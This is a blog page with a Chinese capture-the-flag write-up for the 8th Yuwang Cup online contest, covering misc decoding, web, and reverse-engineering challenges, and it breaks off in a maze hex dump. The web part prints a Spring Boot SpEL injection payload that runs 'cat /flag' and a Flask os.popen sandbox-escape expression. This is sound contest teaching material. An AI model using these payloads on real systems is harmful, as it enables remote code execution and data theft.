<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-CN">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">


  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="Misc信息安全大赛的通知经典签到题目 Word改颜色看到flag  解题收获： 熟悉word套路 编码转换Brainfuck编码，进行解码    拼接下就是flag 解题收获： 更熟悉brainfuck编码，提升信息搜索能力 coding_analyse多重解码  凯撒解码  解题收获： 清晰辨析base各类编码与凯撒密码 bluetooth筛选蓝牙9上的UIH数据包   使用tshark导">
<meta property="og:type" content="article">
<meta property="og:title" content="第八届御网杯线上赛WP">
<meta property="og:url" content="https://flowers-boy.top/posts/34593.html">
<meta property="og:site_name" content="关根">
<meta property="og:description" content="Misc信息安全大赛的通知经典签到题目 Word改颜色看到flag  解题收获： 熟悉word套路 编码转换Brainfuck编码，进行解码    拼接下就是flag 解题收获： 更熟悉brainfuck编码，提升信息搜索能力 coding_analyse多重解码  凯撒解码  解题收获： 清晰辨析base各类编码与凯撒密码 bluetooth筛选蓝牙9上的UIH数据包   使用tshark导">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921038-2144662268.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921034-1024865016.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921173-1404001639.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921009-1737006962.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005920950-466352582.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005920991-1618520807.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921152-769029822.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921146-1405401380.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921000-228492241.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921192-1779551118.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921025-1069153129.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921030-630454111.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005920990-646530664.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921151-851550303.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921142-1674694945.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921167-446902796.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921273-194938118.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921214-382870029.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921092-1596218055.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921277-1578743136.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921189-1186011779.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921250-1326402765.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921243-51224060.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921269-769154922.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921202-1289991758.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921408-1287665569.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921546-2124402375.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921419-602456407.jpg">
<meta property="og:image" content="file:///C:/Users/Lenovo/AppData/Local/Temp/msohtmlclip1/01/clip_image058.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921369-1590400038.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921499-1278849294.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921512-942113034.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921485-1543842754.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921411-1787900803.jpg">
<meta property="og:image" content="https://flowers-boy.top/C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241004010343076.png">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921535-1036607592.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921441-1486957154.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921560-391088823.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921585-2046352629.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921546-2140970977.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921450-1252213645.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921458-1226483841.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921595-1495059577.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921462-2002942619.jpg">
<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921454-1116763471.jpg">
<meta property="og:image" content="file:///C:/Users/Lenovo/AppData/Local/Temp/msohtmlclip1/01/clip_image092.jpg">
<meta property="article:published_time" content="2024-10-03T16:55:31.000Z">
<meta property="article:modified_time" content="2024-10-03T17:07:06.231Z">
<meta property="article:author" content="关根">
<meta property="article:tag" content="关根">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921038-2144662268.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://flowers-boy.top/posts/34593.html"/>





  <title>第八届御网杯线上赛WP | 关根</title>
  








<meta name="generator" content="Hexo 7.2.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">关根</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">爱具体的人 做具体的事</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-首页">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-关于我">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于我
          </a>
        </li>
      
        
        <li class="menu-item menu-item-分类">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-归档">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="Searching..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://flowers-boy.top/posts/34593.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="关根">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">第八届御网杯线上赛WP</h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2024-10-04T00:55:31+08:00">
                2024-10-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/writeup/" itemprop="url" rel="index">
                    <span itemprop="name">writeup</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv">本文总阅读量
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
            </span>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <meta name="referrer" content="no-referrer">

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="信息安全大赛的通知"><a href="#信息安全大赛的通知" class="headerlink" title="信息安全大赛的通知"></a>信息安全大赛的通知</h3><p>经典签到题目</p>
<p>Word改颜色看到flag</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921038-2144662268.jpg" alt="img"></p>
<p>解题收获：</p>
<p>熟悉word套路</p>
<h3 id="编码转换"><a href="#编码转换" class="headerlink" title="编码转换"></a>编码转换</h3><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Brainfuck">Brainfuck</a>编码，进行解码</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921034-1024865016.jpg" alt="img"></p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921173-1404001639.jpg" alt="img"></p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921009-1737006962.jpg" alt="img"></p>
<p>拼接下就是flag</p>
<p>解题收获：</p>
<p>更熟悉brainfuck编码，提升信息搜索能力</p>
<h3 id="coding-analyse"><a href="#coding-analyse" class="headerlink" title="coding_analyse"></a>coding_analyse</h3><p>多重解码</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005920950-466352582.jpg" alt="img"></p>
<p>凯撒解码</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005920991-1618520807.jpg" alt="img"></p>
<p>解题收获：</p>
<p>清晰辨析base各类编码与凯撒密码</p>
<h3 id="bluetooth"><a href="#bluetooth" class="headerlink" title="bluetooth"></a>bluetooth</h3><p>筛选蓝牙9上的UIH数据包</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921152-769029822.jpg" alt="img"></p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921146-1405401380.jpg" alt="img"></p>
<p>使用tshark导出到123txt</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921000-228492241.jpg" alt="img"></p>
<p>这里能组成压缩包</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921192-1779551118.jpg" alt="img"></p>
<p>010保存到本地后解压</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921025-1069153129.jpg" alt="img"></p>
<p>将二者进行10-16进制转换，异或得到flag</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921030-630454111.jpg" alt="img"></p>
<p>解题收获：</p>
<p>更熟悉压缩包文件头属性，解码语言能力，wireshark的流量分析及kali中tshrak对数据的导出命令的使用</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="input-data"><a href="#input-data" class="headerlink" title="input_data"></a>input_data</h3><p>御剑扫描到index.php</p>
<p>根据提示进入&#x2F;.svn</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005920990-646530664.jpg" alt="img"></p>
<p>目录下翻找到flag</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921151-851550303.jpg" alt="img"></p>
<p>解题收获：</p>
<p>信息检索</p>
<h3 id="Admin"><a href="#Admin" class="headerlink" title="Admin"></a>Admin</h3><p>打开网站无80web服务，dirsearch扫描</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921142-1674694945.jpg" alt="img"></p>
<p>各个界面都访问，发现明显spring boot漏洞</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921167-446902796.jpg" alt="img"></p>
<p>根据文章参考写payload</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921273-194938118.jpg" alt="img"></p>
<p>最终为获取flag</p>
<p>&#x2F;admin;&#x2F;?path&#x3D;<strong>${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(“cat &#x2F;flag”).getInputStream()).next()}</strong>::.x</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921214-382870029.jpg" alt="img"></p>
<p>解题收获：</p>
<p>信息检索，目录扫描，spring boot远程代码执行，对已知漏洞熟练使用payload</p>
<h3 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h3><p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921092-1596218055.jpg" alt="img">可以被’open(<strong>import</strong>(“os”).popen(“ls”).read())’等绕过</p>
<p>用自动化的 Python 沙箱逃逸脚本</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921277-1578743136.jpg" alt="img"></p>
<p>得到payload</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921189-1186011779.jpg" alt="img"></p>
<p>解题收获：</p>
<p>对flask题型增加新的理解，熟悉利用github已知脚本对框架进行利用</p>
<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="ez-apk"><a href="#ez-apk" class="headerlink" title="ez_apk"></a>ez_apk</h3><p>使用jadx反编译</p>
<p>定义了checkin方法</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921250-1326402765.jpg" alt="img"></p>
<p>获取密钥key，拿到cipher</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921243-51224060.jpg" alt="img"></p>
<p>计算出正确的cipher</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">&#x27;f`vg\u007fvkXknxfznQv|gz|\u007f&#125;c|G~bh&#123;&#123;x|\u007fVVFGX&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(cipher)):</span><br><span class="line"></span><br><span class="line">  flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(cipher[i:i+<span class="number">1</span>]) ^ i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>计算出flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">cipher_text, secret_key</span>):</span><br><span class="line"></span><br><span class="line">  key_bytes = []</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> char <span class="keyword">in</span> secret_key:</span><br><span class="line"></span><br><span class="line">​    key_bytes.append(<span class="built_in">ord</span>(char))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  decoded_chars = []</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> index, encrypted_char <span class="keyword">in</span> <span class="built_in">enumerate</span>(cipher_text):</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> encrypted_char <span class="keyword">in</span> [<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]:</span><br><span class="line"></span><br><span class="line">​      decoded_chars.append(encrypted_char)</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">​      key_char = key_bytes[index % <span class="built_in">len</span>(key_bytes)] - <span class="number">97</span></span><br><span class="line"></span><br><span class="line">​      cipher_shift = <span class="built_in">ord</span>(encrypted_char) - <span class="number">97</span></span><br><span class="line"></span><br><span class="line">​      decoded_shift = (cipher_shift - key_char) % <span class="number">26</span></span><br><span class="line"></span><br><span class="line">​      decoded_char = <span class="built_in">chr</span>(decoded_shift + <span class="number">97</span>)</span><br><span class="line"></span><br><span class="line">​      decoded_chars.append(decoded_char)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decoded_chars)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">cipher_text = <span class="string">&quot;fatd&#123;**_cgrmvc_ylvhokhuk_gxsgffc_wtec&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">secret_key = <span class="string">&#x27;aptxcony&#x27;</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">decoded_string = decode(cipher_text, secret_key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&gt;&quot;</span>, decoded_string)</span><br></pre></td></tr></table></figure>

<p>解题收获：</p>
<p>反编译函数查找，代码分析及chatgpt利用更熟悉</p>
<h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><p>密码长度检查</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921269-769154922.jpg" alt="img"></p>
<p>最后一个字符必须为w</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921202-1289991758.jpg" alt="img"></p>
<p>调用 check_password() 函数验证</p>
<p>字符串用pow计算，推理</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921408-1287665569.jpg" alt="img"></p>
<p>我们可以使用printf(“%d”,pow1 ((o———–o</p>
<p>​             |      !</p>
<p>​             !      !</p>
<p>​             !      !</p>
<p>​             o———–o).A,2)+(I—I))</p>
<p>将密文输出，得到密文后进行Z3约束求解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">a, b, c, d, e, f, g, h, i, j, k, l = Ints(<span class="string">&quot;a b c d e f g h i j k l&quot;</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">solver.add(a + b == <span class="number">101</span>) <span class="comment"># a + b == 101</span></span><br><span class="line"></span><br><span class="line">solver.add(b + c == <span class="number">143</span>) <span class="comment"># b + c == 143</span></span><br><span class="line"></span><br><span class="line">solver.add(a * c == <span class="number">5035</span>) <span class="comment"># a * c == 5035</span></span><br><span class="line"></span><br><span class="line">solver.add(d + f == <span class="number">163</span>) <span class="comment"># d + f == 163</span></span><br><span class="line"></span><br><span class="line">solver.add(d + e == <span class="number">226</span>) <span class="comment"># d + e == 226</span></span><br><span class="line"></span><br><span class="line">solver.add(e * f == <span class="number">5814</span>) <span class="comment"># e * f == 5814</span></span><br><span class="line"></span><br><span class="line">solver.add(h + i == <span class="number">205</span>) <span class="comment"># h + i == 205</span></span><br><span class="line"></span><br><span class="line">solver.add(g + i == <span class="number">173</span>) <span class="comment"># g + i == 173</span></span><br><span class="line"></span><br><span class="line">solver.add(g * h == <span class="number">9744</span>) <span class="comment"># g * h == 9744</span></span><br><span class="line"></span><br><span class="line">solver.add(j + k * l == <span class="number">5375</span>) <span class="comment"># j + k * l == 5375</span></span><br><span class="line"></span><br><span class="line">solver.add(k + j * l == <span class="number">4670</span>) <span class="comment"># k + j * l == 4670</span></span><br><span class="line"></span><br><span class="line">solver.add(j + k == <span class="number">205</span>) <span class="comment"># j + k == 205</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line"></span><br><span class="line">  model = solver.model()</span><br><span class="line"></span><br><span class="line">  result = [model[v].as_long() <span class="keyword">for</span> v <span class="keyword">in</span> [a, b, c, d, e, f, g, h, i, j, k, l]]</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> result))</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;no ans!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>替换下位置flag就出了</p>
<p>解题收获：</p>
<p>简单的逻辑推理和代码审计，及Z3约束求解方法熟悉</p>
<h3 id="机器猫"><a href="#机器猫" class="headerlink" title="机器猫"></a>机器猫</h3><p>我们使用pyinstxtractor反编译转回源代码.pyc</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921546-2124402375.jpg" alt="img"></p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921419-602456407.jpg" alt="img"></p>
<p>在010查看到加密的base64</p>
<p><img src="file:///C:/Users/Lenovo/AppData/Local/Temp/msohtmlclip1/01/clip_image058.jpg" alt="img"></p>
<p>使用<a target="_blank" rel="noopener" href="https://cyberchef.org/%E8%A7%A3%E5%AF%86%EF%BC%8C%E7%B1%BB%E4%BC%BC%E4%BA%8E%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81">https://cyberchef.org/解密，类似于凯撒密码</a></p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921369-1590400038.jpg" alt="img"></p>
<p>随波逐流</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921499-1278849294.jpg" alt="img"></p>
<p>解题收获：</p>
<p>对python代码反编译出原始pyc使用，010与密码学的熟练运用</p>
<h3 id="CSMazeee"><a href="#CSMazeee" class="headerlink" title="CSMazeee"></a>CSMazeee</h3><p>去壳，用dnspy分析</p>
<p>点击100次可以跳出button1_Click，</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921512-942113034.jpg" alt="img"></p>
<p>每次输入字符会导致 num 发生增减变化，变化的步长是 1；num2 则每次按照步长为 14 进行加减。在处理这些输入字符的过程中，程序会不断计算 mazee[num + num2] 这个索引位置的值。校验规则是：如果 mazee[num + num2] 中的某个中间状态值为 48，则继续校验；当所有输入处理完毕时，mazee[num + num2] 的最终值必须为 49，校验才算通过。</p>
<p><img src="https://img2023.cnblogs.com/blog/3373819/202410/3373819-20241004005921485-1543842754.jpg" alt="img"></p>
<p>十六进制下能看到0x30, 0x30, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x30, 0x30, 0x30, 0x30, 0x0A, 0x0A, 0x2A, 0x30,</p>
<p>  0x30, 0x30, 0x30, 0x30, 0x30, 0x2A, 0x30, 0x2A, 0x2A, 0x30, 0x0A, 0x0A, 0x2A, 0x2A, 0x2A, 0x2A,</p>
<p>  0x2A, 0x2A, 0x30, 0x2A, 0x30, 0x2A, 0x2A, 0x30, 0x0A, 0x0A, 0x2A, 0x2A, 0x31, 0x30, 0x30, 0x2A,</p>
